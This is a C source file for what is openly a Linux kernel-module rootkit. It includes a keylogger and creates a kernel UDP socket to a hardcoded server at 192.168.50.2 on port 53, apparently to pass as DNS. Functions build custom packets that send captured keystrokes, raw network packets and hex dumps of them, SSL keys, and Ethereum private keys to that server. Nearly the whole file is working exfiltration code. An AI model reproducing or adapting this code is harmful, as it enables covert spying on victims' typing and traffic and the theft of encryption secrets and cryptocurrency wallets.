/*
  * This file contains a functions can proportionate communicate with sockets UDP.
  * Works whit Kernel sockets
 */

/*
http://www.haifux.org/lectures/217/netLec5.pdf
https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
https://blog.guillaume-gomez.fr/Linux-kernel/1/7
*/

#pragma once
#pragma message ("Compiling: "__FILE__)

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <net/sock.h>
#include <linux/byteorder/generic.h>
#include <linux/kthread.h>
#include <linux/skbuff.h>
#include "keylogger.c"


// * Hardcoded remote server port and ip
#define SERVER_PORT 53
#define SERVER_ADDR "192.168.50.2"
#define CLIENT_ID 27

// ! Format pr_info
#define pr_fmt(fmt) " %s: %s(): " fmt, KBUILD_MODNAME, __func__


/*__Package send data__*/
/*
  * Types of packages
  * Real-time Keylogger
  * Network package
  * SSL package
 */

#define PCK_REAL_TIME_KEY 0x01
#define PCK_RNET 0x02
#define PCK_SSL 0x03
#define PCK_EKEY 0x04

static struct pckSend_RealTimeKeylogger
{
  uint32_t key;
};
static struct pckSend_Net
{
   
};

union pkgUnionSend
{
  struct pckSend_RealTimeKeylogger pckSend_RealTimeKeylogger;
  struct pckSend_Net pckSend_Net;
};

typedef struct packetSend
{
  uint8_t pckSendType; 
  uint8_t host; 
  union pkgUnionSend pkgUnionSend;
} packetSend;  // (int)8 | whitout union (int) 2


// * Prototypes
static unsigned int inet_addr(char *str);                                 //* Char to int ip format */
static int create_socket_UDP(void);                                       //* Create a socker udp */
static int _bind_socket(struct socket *sock, int port, const char *addr); //* Internal Bind a UDP socket (Create server) */
static void _sock_release(struct socket *sock); //* Internal sock release */
static int bind_socket_UDP(const char *addr, int port); //* Bind a UDP socket (Create server) */
static void free_socket(void); //* Socket release */
static int sendcharBuffUDP(char *buff, int port, const char *addr); /* static buff */
static int _send_UDP_charBuff(struct socket *s, char *buff, int port, const char *addr); //* Internal */
static int sendKey(char *key); //* Send keyboard key */
static void pkt_hex_dump(struct sk_buff *skb);
static int sendNetwork(struct sk_buff *skb); //* Send network packet */
static int sendSSL(char *data,int size); //* Send SSL keys */
static int sendEthereumKey(char *data, int size); //* Send ethereum private key */
static void sendNetwork2(struct sk_buff *skb);
static int _sendNetwork2(char *data, int size);
//* Network packets variable in size if length is 0 is calculated internally */
static int _sendPacket(struct socket *s, char *pck,int lenght,int port, const char *addr);  //* Internal */


/*
  * sock always refers to struct socket / sk always refers to struct sock
  * struct sock is a INET Implementation -> Stores the sk_buff (Packet data)
  * struct socket is a BSD socket -> Stores the sock, file, operations and status.
  * struct socket is an abstraction very close to user space, in other words BSD sockets used to program network applications;
  * struct sock or INET socket in Linux terminology is the network representation of a socket.
  * The struct sk_buff structure is the representation of a network packet and its status. 
  *   The structure is created when a kernel packet is received, either from the user space or from the network interface.
*/

static struct socket *sock; /* Socket struct */
static int state = 0;       /* Socket state -> 1 socket created, 2 socket bind*/
static int server_port = SERVER_PORT;
static char server_addr[15] = SERVER_ADDR;

//* Char to int ip format */
/*
  *function shall convert the string pointed to by *str
  *, in the standard IPv4 dotted decimal notation, to an integer
  *value suitable for use as an Internet address.
*/
static unsigned int inet_addr(char *str)
{
  int a, b, c, d;
  char arr[4];
  sscanf(str, "%d.%d.%d.%d", &a, &b, &c, &d);
  arr[0] = a;
  arr[1] = b;
  arr[2] = c;
  arr[3] = d;
  return *(unsigned int *)arr;
}

static int create_socket_UDP()
{
  /*
  * sock_create_kern params
  ? - &init_net   -> The currently notifier_block called.
  ? - PF_INET     -> PF_INET for IPV4 or PF_INET6 for IPV6 ( PF_PACKET for Raw Packets).
  ? - SOCK_DGRAM  -> SOCK_DGRAM for UDP or SOCK_STREAM for TCP, SCTP, BLUETOOTH or SOCK_RAW for RAW sockets.
  ? - IPPROTO_UDP -> For UDP.
  ? - &sock       -> Pointer to socket struct.
  */
  int err;
  err = sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
  state = 1;
  if (err < 0)
  {
    /* handle error */
    #if verbose == 1
      pr_info("Error creating socket\n");
    #endif
    state = 0;
    return 1;
  }
  #if verbose == 1
    pr_info("Socket created\n");
  #endif
  return 0;
}

// Bind socket (server in udp, not requires listening)
static int _bind_socket(struct socket *sock, int port, const char *addr)
{
  /* Data where the socket will listen */
  struct sockaddr_in __addr = {
      .sin_family = AF_INET,
      // ? The htons() function converts the unsigned short integer hostshort from host byte order to network byte order.
      .sin_port = htons(port),
      // ? The htonl() function converts the unsigned integer hostlong from host byte order to network byte order.
      //.sin_addr = { htonl (INADDR_LOOPBACK) }
      .sin_addr.s_addr = inet_addr(addr)};

  int addrlen = sizeof(__addr);

  // Check socket status
  if (state == 1)
  {
    // Call sock functions (socket functions)
    int err = sock->ops->bind(sock, (struct sockaddr *)&__addr, addrlen);
    if (err < 0)
    {
      #if verbose == 1
        pr_info("Cant bind socket\n");
      #endif
      return 1;
    }
    #if verbose == 1
      pr_info("Bind socket\n");
    #endif
    state = 2;
  }
  return 0;
}
static void _sock_release(struct socket *sock)
{
  if (sock->ops)
  {
    struct module *owner = sock->ops->owner;
    sock->ops->release(sock);
    sock->ops = NULL;
    // ? module_put() - release a reference count to a module
    module_put(owner);
  }
  pr_info("Free socket\n");
  state = 0;
}

static int _send_UDP_charBuff(struct socket *s, char *buff, int port, const char *addr)
{
  // ? for UDP sockets, must be filled in with the address to which the message is sent (struct sockaddr_in)
  /* If it is a reply, you have to get the ip address of the received packet. */

  /* address to send to */
  struct sockaddr_in raddr = {
      .sin_family = AF_INET,
      .sin_port = htons(port),
      // ? //use it as follows: inet_addr() returns address in Network Byte Order, so no need of htonl()
      .sin_addr.s_addr = inet_addr(addr)};
  int raddrlen = sizeof(raddr);

  /*
   * msg_iov is a structure containing the pointer to the data buffer and the length of this buffer. This is where the data to be written or read is stored.
   * msghdr contains the packet data, such as the address and port. 
  */

  /* message */
  struct msghdr msg;
  struct iovec iov;
  int len = strlen(buff) + 1;

  /* build message */
  iov.iov_base = buff;
  iov.iov_len = len;
  msg.msg_flags = 0;
  msg.msg_name = &raddr;
  msg.msg_namelen = raddrlen;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;

  // Check socket status
  if (state != 0)
  {
    /*
       ? return 2 ok
       ? return 1 fail
    */
    return kernel_sendmsg(s, &msg, (struct kvec *)&iov, 1, len);
    // return 0;
  }
  return 1;
}
static int _sendPacket(struct socket *s, char *pck,int lenght,int port, const char *addr)
{
  // ? for UDP sockets, must be filled in with the address to which the message is sent (struct sockaddr_in)
  /* If it is a reply, you have to get the ip address of the received packet. */

  /* address to send to */
  struct sockaddr_in raddr = {
      .sin_family = AF_INET,
      .sin_port = htons(port),
      // ? //use it as follows: inet_addr() returns address in Network Byte Order, so no need of htonl()
      .sin_addr.s_addr = inet_addr(addr)};
  int raddrlen = sizeof(raddr);


  /*
   * msg_iov is a structure containing the pointer to the data buffer and the length of this buffer. This is where the data to be written or read is stored.
   * msghdr contains the packet data, such as the address and port. 
  */

  /* message */
  struct msghdr msg;
  struct iovec iov;
  int len;
  /* Different sizes for a char and a package */
  if(lenght==0){
    len = sizeof(*pck);
  } 
  else{
    len=lenght;
  }
 

  /* build message */
  iov.iov_base = pck;
  iov.iov_len = len;
  msg.msg_flags = 0;
  msg.msg_name = &raddr;
  msg.msg_namelen = raddrlen;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;

  // Check socket status
  if (state != 0)
  {
    /*
       ? return 2 ok
       ? return 1 fail
    */
    return kernel_sendmsg(s, &msg, (struct kvec *)&iov, 1, len);
  }
  return 1;
}
static void free_socket()
{
  _sock_release(sock);
}
static int bind_socket_UDP(const char *addr, int port)
{
  return _bind_socket(sock, port, addr);
}
static int sendcharBuffUDP(char *buff, int port, const char *addr)
{
  return _send_UDP_charBuff(sock, buff, port, addr);
}
static int sendKey(char *key)
{
  // Create realtimeKeylogger packet
  packetSend *pck = kzalloc(sizeof(packetSend), GFP_KERNEL);
  struct pckSend_RealTimeKeylogger *realtime = kzalloc(sizeof(struct pckSend_RealTimeKeylogger), GFP_KERNEL);
  realtime->key = *key;
  pck->host = CLIENT_ID;
  pck->pckSendType = PCK_REAL_TIME_KEY;
  pck->pkgUnionSend.pckSend_RealTimeKeylogger = *realtime;
  // * Watch out for the size of the strcut, without the * we are looking at the size of the pointer and not of the struct
  int x = _sendPacket(sock, (char*) pck,sizeof(*pck), server_port, server_addr);
  kfree(pck);
  kfree(realtime);
  //return x;
  return 0;
}

static int sendSSL(char *keys,int size){
  // Create pckSend_Net packet
  packetSend *pck = kzalloc(sizeof(packetSend), GFP_KERNEL);
  struct pckSend_Net *skbpackt = kzalloc(sizeof(struct pckSend_Net), GFP_KERNEL);
  //skbpackt->data=keys;
  pck->host = CLIENT_ID;
  pck->pckSendType = PCK_SSL;
  pck->pkgUnionSend.pckSend_Net = *skbpackt;
  // * Watch out for the size of the strcut, without the * we are looking at the size of the pointer and not of the struct

  int tamañoTotal = (sizeof(*pck)+size); /* Total size of packet to be sent */
  char *bufferToSend = kzalloc(tamañoTotal, GFP_KERNEL); /* Pointer in the heap with the total packet size */
  memcpy(bufferToSend,pck,sizeof(*pck)); /* Copy the header of packet*/
  memcpy(bufferToSend+sizeof(*pck),(uint8_t *) keys,size); /* Copy the packet contents */
  int x = _sendPacket(sock, bufferToSend,tamañoTotal, server_port, server_addr); /* Send it */
  kfree(pck);
  kfree(bufferToSend);
  kfree(skbpackt);
  return x;
}

static int sendEthereumKey(char *keys, int size){
    // Create pckSend_Net packet
  packetSend *pck = kzalloc(sizeof(packetSend), GFP_KERNEL);
  struct pckSend_Net *skbpackt = kzalloc(sizeof(struct pckSend_Net), GFP_KERNEL);
  //skbpackt->data=keys;
  pck->host = CLIENT_ID;
  pck->pckSendType = PCK_EKEY;
  pck->pkgUnionSend.pckSend_Net = *skbpackt;
  // * Watch out for the size of the strcut, without the * we are looking at the size of the pointer and not of the struct

  int tamañoTotal = (sizeof(*pck)+size); /* Total size of packet to be sent */
  char *bufferToSend = kzalloc(tamañoTotal, GFP_KERNEL); /* Pointer in the heap with the total packet size */
  memcpy(bufferToSend,pck,sizeof(*pck)); /* Copy the header of packet*/
  memcpy(bufferToSend+sizeof(*pck),(uint8_t *) keys,size); /* Copy the packet contents */
  int x = _sendPacket(sock, bufferToSend,tamañoTotal, server_port, server_addr); /* Send it */
  kfree(pck);
  kfree(bufferToSend);
  kfree(skbpackt);
  return x;
}
static int sendNetwork(struct sk_buff *skb)
{
  // Create pckSend_Net packet
  packetSend *pck = kzalloc(sizeof(packetSend), GFP_KERNEL);
  struct pckSend_Net *skbpackt = kzalloc(sizeof(struct pckSend_Net), GFP_KERNEL);

  pck->host = CLIENT_ID;
  pck->pckSendType = PCK_RNET;
  pck->pkgUnionSend.pckSend_Net = *skbpackt;
  
  /* If skb is linear (i.e., skb->data_len == 0), the length of skb->data is skb->len.  http://oldvger.kernel.org/~davem/skb.html*/
  size_t len; /*  The total number of bytes in the packet */
    if (skb_is_nonlinear(skb)) {
        len = skb->data_len;
    } else {
        len = skb->len;
    }

  // * Watch out for the size of the strcut, without the * we are looking at the size of the pointer and not of the struct
  int tamañoTotal = (sizeof(*pck)+len); /* Total size of packet to be sent */
  char *bufferToSend = kzalloc(tamañoTotal, GFP_KERNEL); /* Pointer in the heap with the total packet size */
  memcpy(bufferToSend,pck,sizeof(*pck)); /* Copy the header of packet*/ 
  memcpy(bufferToSend+sizeof(*pck),(uint8_t *) skb_mac_header(skb),len); /* Copies the contents of the mac header up to the end of skb, to the packet to be sent. */
  int x = _sendPacket(sock, bufferToSend,tamañoTotal, server_port, server_addr); /* Send it */
  kfree(pck);
  kfree(skbpackt);
  kfree(bufferToSend);
  return x;
}

/* Second way to send net data */
static void sendNetwork2(struct sk_buff *skb){
    size_t len;
    int rowsize = 16;
    int i, l, linelen, remaining;
    int li = 0;
    uint8_t *data, ch; 

    //printk("Packet hex dump:\n");
    data = (uint8_t *) skb_mac_header(skb);

    if (skb_is_nonlinear(skb)) {
        len = skb->data_len;
    } else {
        len = skb->len;
    }
    char *buffer = kzalloc(sizeof(char)*80000,GFP_KERNEL); 
    remaining = len;
    for (i = 0; i < len; i += rowsize) {
        memset(buffer,0,80000);
        snprintf(buffer,80000,"%06d\t", li);
        _sendNetwork2(buffer,strlen(buffer));
        //printk("%06d\t", li);

        linelen = min(remaining, rowsize);
        remaining -= rowsize;

        for (l = 0; l < linelen; l++) {
            ch = data[l];
            memset(buffer,0,80000);
            snprintf(buffer,80000,"%02X ", (uint32_t) ch);
            _sendNetwork2(buffer,strlen(buffer));
            //printk(KERN_CONT "%02X ", (uint32_t) ch);
        }

        data += linelen;
        li += 10; 
        memset(buffer,0,80000);
        snprintf(buffer,80000,"\n");
        _sendNetwork2(buffer,strlen(buffer));
        //printk(KERN_CONT "\n");
    }
    kfree(buffer);
}

/* Second way to send net data */
static int _sendNetwork2(char *data, int size){
    // Create pckSend_Net packet
  packetSend *pck = kzalloc(sizeof(packetSend), GFP_KERNEL);
  struct pckSend_Net *skbpackt = kzalloc(sizeof(struct pckSend_Net), GFP_KERNEL);
  //skbpackt->data=keys;
  pck->host = CLIENT_ID;
  pck->pckSendType = PCK_RNET;
  pck->pkgUnionSend.pckSend_Net = *skbpackt;
  // * Watch out for the size of the strcut, without the * we are looking at the size of the pointer and not of the struct

  int tamañoTotal = (sizeof(*pck)+size); /* Total size of packet to be sent */
  char *bufferToSend = kzalloc(tamañoTotal, GFP_KERNEL); /* Pointer in the heap with the total packet size */
  memcpy(bufferToSend,pck,sizeof(*pck)); /* Copy the header of packet*/
  memcpy(bufferToSend+sizeof(*pck),(uint8_t *) data,size); /* Copy the packet contents */
  int x = _sendPacket(sock, bufferToSend,tamañoTotal, server_port, server_addr); /* Send it */
  kfree(pck);
  kfree(bufferToSend);
  kfree(skbpackt);
  return x;
}

/* Print skb like a hex file */
static void pkt_hex_dump(struct sk_buff *skb){
    size_t len;
    int rowsize = 16;
    int i, l, linelen, remaining;
    int li = 0;
    uint8_t *data, ch; 

    printk("Packet hex dump:\n");
    data = (uint8_t *) skb_mac_header(skb);

    if (skb_is_nonlinear(skb)) {
        len = skb->data_len;
    } else {
        len = skb->len;
    }

    remaining = len;
    for (i = 0; i < len; i += rowsize) {
        printk("%06d\t", li);

        linelen = min(remaining, rowsize);
        remaining -= rowsize;

        for (l = 0; l < linelen; l++) {
            ch = data[l];
            printk(KERN_CONT "%02X ", (uint32_t) ch);
        }

        data += linelen;
        li += 10; 

        printk(KERN_CONT "\n");
    }
}


